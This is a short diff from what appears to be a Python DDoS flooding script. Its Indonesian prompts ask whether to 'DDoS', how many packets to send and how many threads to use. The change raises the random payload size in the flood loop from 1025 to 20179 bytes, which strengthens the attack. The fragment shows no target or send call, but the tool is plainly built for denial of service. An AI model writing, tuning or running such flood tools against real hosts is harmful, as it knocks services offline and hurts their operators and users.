@@ -31,7 +31,7 @@ choice = str(input(" GASKEN NGEDDOS?(y/n):"))
 times = int(input(" PACKETS:"))
 threads = int(input(" ISI PACKETS:"))
 def run():
-	data = random._urandom(1025)
+	data = random._urandom(20179)
 	i = random.choice(("[*]","[!]","[#]"))
 	while True:
 		try:
